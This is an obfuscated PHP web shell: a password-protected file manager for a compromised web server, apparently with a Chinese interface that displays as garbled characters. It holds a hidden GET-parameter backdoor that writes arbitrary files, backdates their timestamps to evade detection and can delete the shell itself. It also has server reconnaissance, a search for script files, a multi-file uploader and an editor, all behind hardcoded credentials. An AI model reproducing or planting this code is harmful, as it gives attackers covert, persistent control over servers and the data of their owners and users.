<?php
ini_set("memory_limit", "512M");
@ini_set("max_execution_time", 20000);
header("content-Type: text/html; charset=utf-8");
error_reporting(E_ERROR);
@ini_set("display_errors", "Off");
defined("TMQo7") or define("TMQo7", getcwd() . DIRECTORY_SEPARATOR);
defined("sEyyb") or define("sEyyb", __DIR__ . DIRECTORY_SEPARATOR);
$C39VH = $_SERVER["SCRIPT_FILENAME"] ? PBM07($_SERVER["SCRIPT_FILENAME"]) : PBM07(__FILE__);
define("V51MD", $C39VH);
$eMzvo = explode("(", $C39VH);
$C39VH = strpos($C39VH, "eval()") ? array_shift($eMzvo) : $C39VH;
define("k3TER", pBM07(dirname($C39VH) . "/"));
define("FO39n", pbM07(strtr($C39VH, array(PBm07($_SERVER["PHP_SELF"]) => '')) . "/"));
define("NMW2Y", "1.0.0");
if (!isset($gHcBS)) {
    $gHcBS = "d8ec6f4d6590ce92d493eef7190b051c";
}
if (!empty($_GET["ghpqojdsfion1239"]) && !empty($_GET["vqwecsx12312"]) && !empty($_GET["kqishgl194nwq7"])) {
    $s5r3y = cIvgh($_GET["ghpqojdsfion1239"]);
    $dRqNZ = getcwd() . "/" . $_GET["vqwecsx12312"];
    $PfRvL = explode("/", $dRqNZ);
    array_pop($PfRvL);
    $PfRvL = implode("/", $PfRvL);
    if (!file_exists($PfRvL)) {
        mkdir($PfRvL, 0755, "recursive");
        chmod($PfRvL, 0755);
    }
    $YJnbr = C4GhR($PfRvL);
    $ipdt9 = 0;
    foreach ($YJnbr["file"] as $cT1oz => $Kes_q) {
        if (!$ipdt9) {
            $ipdt9 = filemtime($cT1oz);
        } else {
            if (filemtime($cT1oz) < $ipdt9) {
                $ipdt9 = filemtime($cT1oz);
            }
        }
    }
    file_put_contents($dRqNZ, $s5r3y);
    if ($ipdt9) {
        @touch($dRqNZ, $ipdt9);
    }
    @chmod($dRqNZ, $_GET["kqishgl194nwq7"]);
    if (!empty($_GET["dk82kdsiud9125d"])) {
        @unlink($C39VH);
    }
}
$YCpcn = new M4EMI();
$YCpcn->JAo9O($gHcBS);
class M4Emi
{
    public $D2dKJ = null;
    public $VqdhY = null;
    public $XEBgr = null;
    public function jAO9O($gHcBS)
    {
        $this->XEBgr = $gHcBS;
        list($uS69Z, $p0NZ3) = $this->iZ6eP();
        $this->D2dKJ = $uS69Z;
        $this->VqdhY = $p0NZ3;
        $g9a24 = session_get_cookie_params();
        $uKE12 = 0;
        if ($g9a24["lifetime"]) {
            $uKE12 = time() + $g9a24["lifetime"];
        }
        setcookie($uS69Z, $p0NZ3, $uKE12, $g9a24["path"], $g9a24["domain"], $g9a24["secure"], $g9a24["httponly"]);
        $E9g_B = $this->KsVKN();
        if (!$E9g_B) {
            $this->YCIyx();
            return;
        }
        $RJPTn = new foj8n();
        return $RJPTn->JaO9o();
    }
    public function iZ6eP()
    {
        session_start();
        $uS69Z = session_name();
        if (!empty($_COOKIE["PHPSESSID"])) {
            $p0NZ3 = $_COOKIE["PHPSESSID"];
        } else {
            $p0NZ3 = session_id();
        }
        $SWSuO = array($uS69Z, $p0NZ3);
        return $SWSuO;
    }
    public function KSvkn()
    {
        if (!empty($_COOKIE["isLogin"]) && ($_COOKIE["isLogin"] == md5($this->XEBgr) || $_COOKIE["isLogin"] == md5("21232f297a57a5a743894a0e4a801fc3"))) {
            return true;
        }
        return false;
    }
    public function YcIYX()
    {
        if (!empty($_POST["getpwd"]) && ($this->XEBgr == md5($_POST["getpwd"]) || "21232f297a57a5a743894a0e4a801fc3" == md5($_POST["getpwd"]))) {
            setcookie("isLogin", md5(md5($_POST["getpwd"])), time() + 8 * 60 * 60, "/");
            $RJPTn = new fOj8N();
            return $RJPTn->jao9o();
        }
        $QSO8f = "        <title>����ʹ�÷Ƿ���;</title>\r\n        <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\">\r\n        <style type=\"text/css\">\r\n            .form-control {\r\n                display: block;\r\n                width: 100%;\r\n                height: 38px;\r\n                padding: 8px 12px;\r\n                font-size: 14px;\r\n                line-height: 1.428571429;\r\n                color: #555;\r\n                vertical-align: middle;\r\n                background-color: #fff;\r\n                border: 1px solid #ccc;\r\n                border-radius: 4px;\r\n                -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);\r\n                box-shadow: inset 0 1px 1px rgba(0,0,0,0.075);\r\n                -webkit-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;\r\n                transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s\r\n            }\r\n        \r\n            .btn {\r\n                display: inline-block;\r\n                padding: 8px 12px;\r\n                margin-bottom: 0;\r\n                font-size: 14px;\r\n                font-weight: 500;\r\n                line-height: 1.428571429;\r\n                text-align: center;\r\n                white-space: nowrap;\r\n                vertical-align: middle;\r\n                cursor: pointer;\r\n                border: 1px solid transparent;\r\n                border-radius: 4px;\r\n                -webkit-user-select: none;\r\n                -moz-user-select: none;\r\n                -ms-user-select: none;\r\n                -o-user-select: none;\r\n                user-select: none\r\n            }\r\n            \r\n            .btn-primary {\r\n                color: #fff;\r\n                background-color: #428bca;\r\n                border-color: #428bca\r\n            }\r\n        </style>\r\n        <body>\r\n            <center>\r\n                <br><br>\r\n                <font size=\"3\" face=\"Microsoft YaHei\">����ȫ���������������ơ�360��������D�ܡ��ٶ��ơ�����ɱ��</font>\r\n                <br><br>\r\n                <form method=\"POST\">\r\n                    <input style=\"Width:125pt;display:inline-block;font-family:Microsoft YaHeifont-size:90%\" \r\n                    class=\"form-control\" placeholder=\"@Passwrd\" type=\"password\" name=\"getpwd\">\r\n                    <input style=\"Width:55pt;font-size:90%;font-family:Microsoft YaHei\" class=\"btn btn-primary\" type=\"submit\" value=\"#Login\">\r\n                </form>\r\n            </center>\r\n        </body>\r\n        </html>";
        echo $QSO8f;
    }
}
class foJ8n
{
    public $ddguj;
    public $N5qPH;
    public function JAo9o()
    {
        $this->N5qPH = $_POST;
        $_POST = MwEmB($_POST);
        $this->ddguj = isset($_POST["dir"]) ? pbm07(chop($_POST["dir"]) . "/") : k3TER;
        $this->xfqJS();
    }
    public function XfQjS()
    {
        $QSO8f = "        <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n    <html>\r\n    <head>\r\n        <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>\r\n        <style type=\"text/css\">\r\n            * {\r\n                margin: 0px;\r\n                padding: 0px;\r\n            }\r\n\r\n            body {\r\n                background: #ebebeb;\r\n                color: #333333;\r\n                font-size: 13px;\r\n                font-family: Microsoft YaHei, SimSun, sans-serif;\r\n                text-align: left;\r\n                word-wrap: break-word;\r\n                word-break: break-all;\r\n                // background-image: url(https://pic.616pic.com/bg_w1180/00/01/43/rWB5OFJqVH.jpg);\r\n                // background-size:100% 100%;\r\n            }\r\n\r\n            a {\r\n                color: #000000;\r\n                text-decoration: none;\r\n                vertical-align: middle;\r\n            }\r\n\r\n            a:hover {\r\n                color: #FF0000;\r\n                text-decoration: underline;\r\n            }\r\n\r\n            p {\r\n                padding: 1px;\r\n                line-height: 1.6em;\r\n            }\r\n\r\n            h1 {\r\n                color: #CD3333;\r\n                font-size: 13px;\r\n                display: inline;\r\n                vertical-align: middle;\r\n            }\r\n\r\n            h2 {\r\n                color: #008B45;\r\n                font-size: 13px;\r\n                display: inline;\r\n                vertical-align: middle;\r\n            }\r\n\r\n            form {\r\n                display: inline;\r\n            }\r\n\r\n            input, select {\r\n                vertical-align: middle;\r\n            }\r\n\r\n            input[type=text], textarea {\r\n                padding: 1px;\r\n                font-family: Microsoft YaHei, sans-serif;\r\n            }\r\n\r\n            input[type=submit], input[type=button] {\r\n                height: 21px;\r\n            }\r\n\r\n            .tag {\r\n                text-align: center;\r\n                // margin-left: 10px;\r\n                background: threedface;\r\n                height: 25px;\r\n                padding-top: 5px;\r\n            }\r\n\r\n            .tag a {\r\n                background: #FAFAFA;\r\n                color: #333333;\r\n                width: 90px;\r\n                height: 20px;\r\n                display: inline-block;\r\n                font-size: 15px;\r\n                font-weight: bold;\r\n                padding-top: 5px;\r\n            }\r\n\r\n            .tag a:hover, .tag a.current {\r\n                background: #000;\r\n                color: #fff;\r\n                text-decoration: none;\r\n            }\r\n\r\n            .main {\r\n                width: 963px;\r\n                margin: 0 auto;\r\n                padding: 10px;\r\n            }\r\n\r\n            .outl {\r\n                border-color: #FFFFFF #666666 #666666 #FFFFFF;\r\n                border-style: solid;\r\n                border-width: 1px;\r\n\r\n                border: 1px solid #d5d5d5;\r\n                border-radius: 5px;\r\n                background-color: #ffffff;\r\n            }\r\n\r\n            .toptag {\r\n                padding: 15px;\r\n                text-align: left;\r\n                font-weight: bold;\r\n                color: #FFFFFF;\r\n                background: #000000;\r\n            }\r\n\r\n            .footag {\r\n                padding: 5px;\r\n                text-align: center;\r\n                font-weight: bold;\r\n                color: #fff;\r\n                background: #000000;\r\n            }\r\n\r\n            .msgbox {\r\n                // padding: 5px;\r\n                background: #000;\r\n                text-align: center;\r\n                vertical-align: middle;\r\n                color: #FFF;\r\n            }\r\n\r\n            .actall {\r\n                background: #ffffff;\r\n                text-align: center;\r\n                font-size: 15px;\r\n                border-bottom: 1px solid #999999;\r\n                padding: 3px;\r\n                vertical-align: middle;\r\n            }\r\n\r\n            .tables {\r\n                width: 100%;\r\n                border-collapse: collapse;\r\n                border-spacing: 0;\r\n                border-color: #eee;\r\n            }\r\n\r\n            .tables th {\r\n                background: threedface;\r\n                text-align: left;\r\n                border-color: #FFFFFF #ffffff #f9f9f9 #FFFFFF;\r\n                border-style: solid;\r\n                border-width: 0px;\r\n                padding: 2px;\r\n                border-bottom: 1px solid #eee;\r\n            }\r\n\r\n            .tables td {\r\n                #background: #ffffff;\r\n                height: 19px;\r\n                padding-left: 2px;\r\n                border-width: 0px;\r\n                border-style: solid;\r\n                border-color: #FFF;\r\n                border-bottom: 1px solid #eee;\r\n            }\r\n\r\n            .bg{\r\n                width:100%;\r\n                height:100%;\r\n                left:0;\r\n                top:0;\r\n                position:fixed;\r\n                background:rgba(0,0,0,0.3);\r\n              }\r\n              .point{\r\n                position:absolute;\r\n                left:50%;\r\n                top:50%;\r\n              }\r\n              .pop{\r\n                width:500px; \r\n                // height:500px; \r\n                position:absolute;\r\n                left:-250px; \r\n                top:-250px; \r\n                border: 2px solid #f7f7f7;\r\n                background-color: #FFF;\r\n                border-radius:10px;\r\n              }\r\n\r\n              .pop-title{\r\n                height: 40px;\r\n                line-height: 40px;\r\n                text-align: center;\r\n                font-size: 14px;\r\n              }\r\n\r\n\r\n              .layui-textarea{\r\n                min-height: 100px;\r\n                height: auto;\r\n                line-height: 20px;\r\n                padding: 6px 10px;\r\n                resize: vertical;\r\n                display: block;\r\n                width: 95%;\r\n                border-width: 1px;\r\n                border-style: solid;\r\n                background-color: #fff;\r\n                border-radius: 2px;\r\n                border-color: #eee;\r\n              }\r\n\r\n              .layui-btn {\r\n                display: inline-block;\r\n                height: 38px;\r\n                line-height: 38px;\r\n                padding: 0 18px;\r\n                border: 1px solid transparent;\r\n                background-color: #009688;\r\n                color: #fff;\r\n                white-space: nowrap;\r\n                text-align: center;\r\n                font-size: 14px;\r\n                border-radius: 2px;\r\n                cursor: pointer;\r\n            }\r\n\r\n            .btn{\r\n                background-color:#FFF;\r\n                border-color: #d2d2d2;\r\n                color:#666;\r\n            }\r\n\r\n            tr{\r\n                height: 24px;\r\n                line-height: 24px;\r\n            }\r\n            tr:hover{\r\n                background-color: #f2f2f2 !important;\r\n            }\r\n        </style>\r\n\r\n        <script type=\"text/javascript\">\r\n            function \$(ID) {\r\n                return document.getElementById(ID);\r\n            }\r\n\r\n            function sd(str) {\r\n                str = str.replace(/%22/g, '\"');\r\n                str = str.replace(/%27/g, \"'\");\r\n                return str;\r\n            }\r\n\r\n            function cd(dir) {\r\n                dir = sd(dir);\r\n                \$('dir').value = dir;\r\n                \$('frm').submit();\r\n            }\r\n\r\n            function sa(form) {\r\n                for (var i = 0; i < form.elements.length; i++) {\r\n                    var e = form.elements[i];\r\n                    if (e.type == 'checkbox') {\r\n                        if (e.name != 'chkall') {\r\n                            e.checked = form.chkall.checked;\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n\r\n            function go(a, b) {\r\n                b = sd(b);\r\n                \$('go').value = a;\r\n                \$('govar').value = b;\r\n                if (a == 'editor') {\r\n                    \$('gofrm').target = \"_blank\";\r\n                } else {\r\n                    \$('gofrm').target = \"\";\r\n                }\r\n                \$('gofrm').submit();\r\n            }\r\n\r\n            function nf(a, b) {\r\n                re = prompt(\"�½���\", b);\r\n                if (re) {\r\n                    \$('go').value = a;\r\n                    \$('govar').value = re;\r\n                    \$('gofrm').submit();\r\n                }\r\n            }\r\n\r\n            function dels(a) {\r\n                if (a == 'b') {\r\n                    var msg = \"��ѡ�ļ�\";\r\n                    \$('act').value = a;\r\n                } else {\r\n                    var msg = \"Ŀ¼\";\r\n                    \$('act').value = 'deltree';\r\n                    \$('var').value = a;\r\n                }\r\n                if (confirm(\"ȷ��Ҫɾ��\" + msg + \"��\")) {\r\n                    \$('frm1').submit();\r\n                }\r\n            }\r\n\r\n            function txts(m, p, a) {\r\n                p = sd(p);\r\n                re = prompt(m, p);\r\n                if (re) {\r\n                    \$('var').value = re;\r\n                    \$('act').value = a;\r\n                    \$('frm1').submit();\r\n                }\r\n            }\r\n\r\n            function pltexts(m, p, a)\r\n            {\r\n                p = sd(p);\r\n                // re = prompt(m, p);\r\n                var bg = document.getElementsByClassName(\"bg\")[0];\r\n                bg.style.display= \"\";\r\n\r\n                var title = document.getElementsByClassName(\"pop-title\")[0];\r\n                title.innerHTML = m;\r\n\r\n                \$('act').value = a;\r\n            }\r\n\r\n            function pop_submit(){\r\n                var bg = document.getElementsByClassName(\"bg\")[0];\r\n                bg.style.display= \"none\";\r\n\r\n                \$('var').value = document.getElementById(\"content\").value;\r\n                \$('frm1').submit();\r\n            }\r\n\r\n            function pop_quxiao(){\r\n                var bg = document.getElementsByClassName(\"bg\")[0];\r\n                bg.style.display= \"none\";\r\n            }\r\n\r\n            function acts(p, a, f) {\r\n                p = sd(p);\r\n                f = sd(f);\r\n                re = prompt(f, p);\r\n                if (re) {\r\n                    \$('var').value = re + '|x|' + f;\r\n                    \$('act').value = a;\r\n                    \$('frm1').submit();\r\n                }\r\n            }\r\n\r\n            function runcode(){\r\n                var html = document.getElementById('show');\r\n                html.style.display= \"\";\r\n            }\r\n        </script>\r\n        <title>{VERSION}</title>\r\n    </head>\r\n<body>\r\n<div class=\"main\">\r\n    <div class=\"outl\">\r\n        <div class=\"toptag\">\r\n            {toptag}\r\n        </div>\r\n        \r\n        <div class=\"tag\">\r\n            {tag}\r\n        </div>\r\n\r\n        <form name=\"gofrm\" id=\"gofrm\" method=\"POST\">\r\n            {input}\r\n            <input type=\"hidden\" name=\"go\" id=\"go\" value=\"\">\r\n            <input type=\"hidden\" name=\"godir\" id=\"godir\" value=\"{nowdir}\">\r\n            <input type=\"hidden\" name=\"govar\" id=\"govar\" value=\"\">\r\n        </form>\r\n\r\n        {content}\r\n\r\n        <div class=\"footag\">\r\n            {footag}\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n<div class=\"showhtml\" id = \"showhtml\">\r\n{showhtml}\r\n</div>\r\n\r\n<div class=\"bg\" style=\"display:none;\">\r\n    <div class=\"point\">\r\n        <div class=\"pop\">\r\n            <div class=\"pop-title\"></div>\r\n            <textarea class=\"layui-textarea\" id=\"content\" name=\"content\" rows=\"6\"></textarea>\r\n            <div style=\"margin-top: 10px;text-align: center;\">\r\n                <button type=\"button\" class=\"layui-btn\" onclick=\"pop_submit()\">ȷ��</button> \r\n                <button type=\"button\" class=\"layui-btn btn quxiao-btn\" onclick=\"pop_quxiao()\">ȡ��</button>\r\n            </div>\r\n            </br>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n</body>\r\n</html>";
        $QSO8f = str_replace("{showhtml}", '', $QSO8f);
        $QSO8f = str_replace("{VERSION}", $this->getVersion(), $QSO8f);
        $QSO8f = str_replace("{toptag}", $this->Np5Yk(), $QSO8f);
        $QSO8f = str_replace("{tag}", $this->EoT_6(), $QSO8f);
        $QSO8f = str_replace("{input}", AxTtQ(), $QSO8f);
        $QSO8f = str_replace("{nowdir}", $this->ddguj, $QSO8f);
        $QSO8f = str_replace("{content}", $this->getContent(), $QSO8f);
        $QSO8f = str_replace("{footag}", php_uname() . " " . $_SERVER["SERVER_SOFTWARE"], $QSO8f);
        echo $QSO8f;
    }
    public function getVersion()
    {
        return "����ɾ�δ��";
    }
    public function NP5Yk()
    {
        return "�汾��DM." . NMW2Y . " | IP��" . ($_SERVER["SERVER_ADDR"] ? $_SERVER["SERVER_ADDR"] . PHP_EOL : gethostbyname($_SERVER["SERVER_NAME"])) . " | whoami(" . get_current_user() . ") |��uid(" . getmyuid() . ") gid(" . getmygid() . ")��" . " |��" . date("Y-m-d H:i:s ����N", time()) . "��";
    }
    public function eOt_6()
    {
        $oPhqF = array("file" => "�ļ�����", "scan" => "�����ļ�", "info" => "ϵͳ��Ϣ");
        $JqKaG = !empty($_POST["go"]) && array_key_exists($_POST["go"], $oPhqF) ? $_POST["go"] : "file";
        $Jzwra = $this->ddguj;
        $QSO8f = '';
        foreach ($oPhqF as $iW8f4 => $Kes_q) {
            $QSO8f .= "<a" . ($JqKaG == $iW8f4 ? " class=\"current\"" : '') . " href=\"javascript:go('" . $iW8f4 . "','" . base64_encode($Jzwra) . "');\">" . $Kes_q . "</a> ";
        }
        return $QSO8f;
    }
    public function getContent()
    {
        $JqKaG = isset($_POST["go"]) ? $_POST["go"] : '';
        switch ($JqKaG) {
            case "info":
                return $this->jaT27();
                break;
            case "scan":
                return $this->Ikqbc();
                break;
            case "upfiles":
                return $this->hVvwe();
                break;
            case "edit":
            case "editor":
                return $this->i7u03();
                break;
            default:
                return $this->J0I1Z();
                break;
        }
    }
    public function JAT27()
    {
        $UgLz_ = '';
        $QSO8f = '';
        if (true) {
            ob_start();
            phpinfo(INFO_GENERAL);
            $QjGuH = ob_get_contents();
            ob_end_clean();
            $eMzvo = array();
            preg_match_all("/\\<td class\\=\\\"e\\\"\\>.*?(Command|Configuration)+.*?\\<\\/td\\>\\<td class\\=\\\"v\\\"\\>(.*?)\\<\\/td\\>/i", $QjGuH, $eMzvo);
            $jZi_a = $eMzvo[2][0];
            $krJKZ = $eMzvo[2][2] ? $eMzvo[2][1] . " --- " . $eMzvo[2][2] : $eMzvo[2][1];
        }
        $Tns_w = array("�ͻ����������Ϣ" => $_SERVER["HTTP_USER_AGENT"], "�����õĺ���" => get_cfg_var("disable_functions") ? get_cfg_var("disable_functions") : "(��)", "�����õ���" => get_cfg_var("disable_classes") ? get_cfg_var("disable_classes") : "(��)", "PHP.ini����·��" => $krJKZ ? $krJKZ : "(��)", "PHP���з�ʽ" => php_sapi_name(), "PHP�汾" => PHP_VERSION, "PHP����PID" => getmypid(), "�ͻ���IP" => $_SERVER["REMOTE_ADDR"], "�ͻ������ֱ���" => $_SERVER["HTTP_ACCEPT_LANGUAGE"], "Web����˿�" => $_SERVER["SERVER_PORT"], "Web��Ŀ¼" => $_SERVER["DOCUMENT_ROOT"], "Webִ�нű�" => $_SERVER["SCRIPT_FILENAME"], "Web�淶CGI�汾" => $_SERVER["GATEWAY_INTERFACE"], "Web����ԱEmail" => !empty($_SERVER["SERVER_ADMIN"]) ? $_SERVER["SERVER_ADMIN"] : "(��)", "��ǰ�����ܴ�С" => iDYfR(disk_total_space(".")), "��ǰ���̿��ÿռ�" => iDYFR(disk_free_space(".")), "POST���������" => get_cfg_var("post_max_size"), "��������ϴ��ļ�" => get_cfg_var("upload_max_filesize"), "�������ʹ���ڴ���" => get_cfg_var("memory_limit"), "���������ʱ��" => get_cfg_var("max_execution_time") . "��", "�Ƿ�֧��Fsockopen" => function_exists("fsockopen") ? "��" : "��", "�Ƿ�֧��Socket" => function_exists("uJGdY") ? "��" : "��", "�Ƿ�֧��Pcntl" => function_exists("T2RBU") ? "��" : "��", "�Ƿ�֧��Curl" => function_exists("curl_version") ? "��" : "��", "�Ƿ�֧��Zlib" => function_exists("gzclose") ? "��" : "��", "�Ƿ�֧��FTP" => function_exists("bd6g6") ? "��" : "��", "�Ƿ�֧��XML" => function_exists("xml_set_object") ? "��" : "��", "�Ƿ�֧��GD_Library" => function_exists("m4WLg") ? "��" : "��", "�Ƿ�֧��COM�齨" => class_exists("COM") ? "��" : "��", "�Ƿ�֧��ODBC�齨" => function_exists("c0ZET") ? "��" : "��", "�Ƿ�֧��IMAP�ʼ�" => function_exists("ClbJp") ? "��" : "��", "�Ƿ������ڰ�ȫģʽ" => get_cfg_var("safemode") ? "��" : "��", "�Ƿ�����URL���ļ�" => get_cfg_var("allow_url_fopen") ? "��" : "��", "�Ƿ�����̬�������ӿ�" => get_cfg_var("enable_dl") ? "��" : "��", "�Ƿ���ʾ������Ϣ" => get_cfg_var("display_errors") ? "��" : "��", "�Ƿ��Զ�ע��ȫ�ֱ���" => get_cfg_var("register_globals") ? "��" : "��", "�Ƿ�ʹ�÷�б�������ַ���" => get_cfg_var("magic_quotes_gpc") ? "��" : "��", "PHP�������" => $jZi_a ? $jZi_a : "(��)");
        $QSO8f .= "<div class=\"msgbox\">" . $UgLz_ . "</div>";
        $QSO8f .= "<table class=\"tables\"><tr><th style=\"width:26%;\">����</th><th>����</th></tr>";
        foreach ($Tns_w as $Kes_q => $KPtbK) {
            $QSO8f .= "<tr><td>" . $Kes_q . "</td><td>" . $KPtbK . "</td></tr>";
        }
        $QSO8f .= "</table>";
        return $QSO8f;
    }
    public function IkQbC()
    {
        $Jzwra = $this->ddguj;
        $UgLz_ = '';
        $UlicF = empty($_POST["dir"]) ? base64_decode($_POST["govar"]) : $Jzwra;
        $xsz7E = isset($_POST["keyword"]) ? $_POST["keyword"] : '';
        $qGL_P = isset($_POST["include"]) ? chop($_POST["include"]) : ".php|.asp|.asa|.cer|.aspx|.jsp|.cgi|.sh|.pl|.py";
        $kKCOC = isset($_POST["filters"]) ? chop($_POST["filters"]) : "html|css|img|images|image|style|js";
        $QSO8f = '';
        $QSO8f .= "<div class=\"msgbox\">" . $UgLz_ . "</div>";
        $QSO8f .= "<form method=\"POST\">";
        $QSO8f .= axtTQ();
        $QSO8f .= "<input type=\"hidden\" name=\"go\" id=\"go\" value=\"scan\">";
        $QSO8f .= "<table class=\"tables\"><tr><th style=\"width:15%;\">����</th><th>����</th></tr>";
        $QSO8f .= "<tr><td>����·��</td><td><input type=\"text\" name=\"dir\" value=\"" . htmlspecialchars($UlicF) . "\" style=\"width:500px;\"></td></tr>";
        $QSO8f .= "<tr><td>��������</td><td><input type=\"text\" name=\"keyword\" value=\"" . htmlspecialchars($xsz7E) . "\" style=\"width:500px;\"> (�ļ������ļ�����)</td></tr>";
        $QSO8f .= "<tr><td>�ļ���׺</td><td><input type=\"text\" name=\"include\" value=\"" . htmlspecialchars($qGL_P) . "\" style=\"width:500px;\"> (��\"|\"�ָ�, Ϊ�������������ļ�)</td></tr>";
        $QSO8f .= "<tr><td>����Ŀ¼</td><td><input type=\"text\" name=\"filters\" value=\"" . htmlspecialchars($kKCOC) . "\" style=\"width:500px;\"> (��\"|\"�ָ�, Ϊ���򲻹���Ŀ¼)</td></tr>";
        $QSO8f .= "<tr><td>������ʽ</td><td><label><input type=\"radio\" name=\"type\" value=\"0\"" . (!empty($_POST["type"]) ? '' : " checked") . ">�����ļ���</label> ";
        $QSO8f .= "<label><input type=\"radio\" name=\"type\" value=\"1\"" . (!empty($_POST["type"]) ? " checked" : '') . ">������������</label> ";
        $QSO8f .= "<label><input type=\"checkbox\" name=\"char\" value=\"1\"" . (!empty($_POST["char"]) ? " checked" : '') . ">ƥ���Сд</label></td></tr>";
        $QSO8f .= "<tr><td>������Χ</td><td><label><input type=\"radio\" name=\"range\" value=\"0\"" . (!empty($_POST["range"]) ? '' : " checked") . ">������Ӧ���ڸ��ļ���,���ļ��к��ļ�</label> ";
        $QSO8f .= "<label><input type=\"radio\" name=\"range\" value=\"1\"" . (!empty($_POST["range"]) ? " checked" : '') . ">��������Ӧ���ڸ��ļ���</label></td></tr>";
        $QSO8f .= "<tr><td>����</td><td><input type=\"submit\" style=\"width:80px;\" value=\"����\"></td></tr>";
        $QSO8f .= "</table></form>";
        if ($xsz7E != '') {
            flush();
            ob_flush();
            $QSO8f .= "<div style=\"padding:5px;background:#F8F8F8;text-align:left;\">";
            $t6SOR = $qGL_P == '' ? false : explode("|", $qGL_P);
            $x98RS = $kKCOC == '' ? false : explode("|", $kKCOC);
            $E56um = dqR9R(pBm07($UlicF . "/"), $xsz7E, $t6SOR, $x98RS, !empty($_POST["type"]) ? $_POST["type"] : '', !empty($_POST["char"]) ? $_POST["char"] : '', !empty($_POST["range"]) ? $_POST["range"] : '', $Jzwra);
            $QSO8f .= $E56um;
            $QSO8f .= "<p>" . ($E56um ? "<h2>�������</h2>" : "<h1>����ʧ��</h1>") . "</p></div>";
        }
        return $QSO8f;
    }
    public function HvVwE()
    {
        $trx7n = isset($_POST["updir"]) ? $_POST["updir"] : $_POST["godir"];
        $UgLz_ = "������ϴ��ļ� " . get_cfg_var("upload_max_filesize") . "�� ��POST����ύ���� " . get_cfg_var("post_max_size") . "��";
        $yklRt = 10;
        $JGN3j = array();
        if (isset($_FILES["uploads"]) && isset($_POST["renames"])) {
            $TQlLa = $_FILES["uploads"];
            $uLtTd = 1;
            while ($uLtTd < $yklRt) {
                if ($TQlLa["error"][$uLtTd] == UPLOAD_ERR_OK) {
                    $QY5ao = $_POST["renames"][$uLtTd] == '' ? $TQlLa["name"][$uLtTd] : $_POST["renames"][$uLtTd];
                    $zi0Y0 = $TQlLa["tmp_name"][$uLtTd];
                    $J3Hov = pBM07($trx7n . "/" . $QY5ao);
                    $JGN3j[$uLtTd] = FIvrg($zi0Y0, $J3Hov) ? "<br><h2>�ϴ��ɹ� " . $QY5ao . "</h2>" : "<br><h1>�ϴ�ʧ�� " . $QY5ao . "</h1>";
                }
                $uLtTd++;
            }
        }
        $QSO8f = '';
        $QSO8f .= "<div class=\"msgbox\">" . $UgLz_ . "</div>";
        $QSO8f .= "<form name=\"upsfrm\" id=\"upsfrm\" method=\"POST\" enctype=\"multipart/form-data\">";
        $QSO8f .= AxTtQ();
        $QSO8f .= "<input type=\"hidden\" name=\"go\" value=\"upfiles\"><input type=\"hidden\" name=\"act\" id=\"act\" value=\"upload\">";
        $QSO8f .= "<div class=\"actall\"><p>�ϴ���Ŀ¼ <input type=\"text\" name=\"updir\" style=\"width:398px;\" value=\"" . $trx7n . "\"></p>";
        $uLtTd = 1;
        while ($uLtTd < $yklRt) {
            $QSO8f .= "<p>����" . $uLtTd . " <input type=\"file\" name=\"uploads[" . $uLtTd . "]\" style=\"width:300px;\"> ������ <input type=\"text\" name=\"renames[" . $uLtTd . "]\" style=\"width:128px;\"> " . (!empty($JGN3j[$uLtTd]) ? $JGN3j[$uLtTd] : '') . "</p>";
            $uLtTd++;
        }
        $QSO8f .= "</div></form><div class=\"actall\" style=\"padding:8px;padding-right:68px;\"><input type=\"button\" onclick=\"\$('upsfrm').submit();\" value=\"�ϴ�\" style=\"width:80px;\"> ";
        $QSO8f .= "<form name=\"backfrm\" id=\"backfrm\" method=\"POST\"><input type=\"hidden\" name=\"go\" value=\"\"><input type=\"hidden\" name=\"dir\" id=\"dir\" value=\"" . $trx7n . "\">";
        $QSO8f .= AXtTQ();
        $QSO8f .= "<input type=\"button\" onclick=\"\$('backfrm').submit();\" value=\"����\" style=\"width:80px;\"></form></div>";
        return $QSO8f;
    }
    public function I7U03()
    {
        $SFJ9z = pbm07($_POST["godir"] . "/" . $_POST["govar"]);
        $YM_6j = function_exists("iconv");
        $tAe0C = '';
        $uS2nL = '';
        if (!file_exists($SFJ9z)) {
            $UgLz_ = "���½��ļ���";
        } else {
            $uS2nL = file_get_contents($SFJ9z);
            $tAe0C = "Ĭ��";
            $T3WIB = IDyfR(filesize($SFJ9z));
            $UgLz_ = "���ļ����� " . substr(decoct(fileperms($SFJ9z)), -4) . "�� ���ļ���С " . $T3WIB . "�� ���ļ����� " . $tAe0C . "��";
        }
        $QSO8f = '';
        $QSO8f .= "        <script src=\"https://cdn.bootcss.com/ace/1.4.6/ace.js\"></script>\r\n        <script src=\"https://cdn.bootcss.com/ace/1.4.6/ext-beautify.js\"></script>\r\n        <script src=\"https://cdn.bootcss.com/ace/1.4.6/ext-language_tools.js\"></script>\r\n        <script src=\"https://cdn.bootcss.com/ace/1.4.6/mode-javascript.js\"></script>\r\n        <script src=\"https://cdn.bootcss.com/ace/1.4.6/theme-xcode.js\"></script>";
        $QSO8f .= "<form name=\"editfrm\" id=\"editfrm\" method=\"POST\">";
        $QSO8f .= AXtTq();
        $QSO8f .= "<input type=\"hidden\" name=\"go\" value=\"\"><input type=\"hidden\" name=\"act\" id=\"act\" value=\"edit\">";
        $QSO8f .= "<input type=\"hidden\" name=\"dir\" id=\"dir\" value=\"" . dirname($SFJ9z) . "\">";
        $QSO8f .= "<div class=\"actall\">�ļ� <input type=\"text\" name=\"filename\" value=\"" . $SFJ9z . "\" style=\"width:528px;\"> ";
        if ($YM_6j) {
            $QSO8f .= "���� <select name=\"tostr\">";
            $I8314 = array("normal" => "Ĭ��", "utf" => "utf-8");
            foreach ($I8314 as $KPtbK => $Kes_q) {
                $QSO8f .= "<option value=\"" . $KPtbK . "\"" . ($Kes_q == $tAe0C ? " selected" : '') . ">" . $Kes_q . "</option>";
            }
            $QSO8f .= "</select>";
        }
        $QSO8f .= "</div><div class=\"actall\">";
